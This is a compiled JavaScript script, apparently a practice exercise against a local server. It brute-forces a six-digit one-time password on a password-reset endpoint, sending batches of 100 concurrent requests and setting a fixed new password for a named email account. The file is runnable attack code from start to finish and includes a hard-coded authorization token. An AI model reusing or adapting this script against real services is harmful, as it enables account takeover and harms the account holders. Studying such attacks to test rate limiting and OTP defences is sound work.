"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email: "ayig2302@gmail.com",
            otp: otp.toString(),
            newPassword: "123456789",
        });
        let config = {
            method: "post",
            maxBodyLength: Infinity,
            url: "http://localhost:3000/reset-password",
            headers: {
                Authorization: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NH0.zOSYXIYyI9zc0E1E2QntAoKBw6HohISXYi6L6ok3wLA",
                "Content-Type": "application/json",
            },
            data: data,
        };
        try {
            const response = yield axios_1.default.request(config);
            if (response.status === 200)
                return true;
        }
        catch (e) { }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 100000; i < 1000000; i += 100) {
            const promises = [];
            console.log("Checking range: " + i + " to " + (i + 99));
            for (let j = 0; j < 100; j++) {
                promises.push(sendRequest(i + j));
            }
            const results = yield Promise.all(promises);
            if (results.includes(true)) {
                break;
            }
        }
    });
}
main();
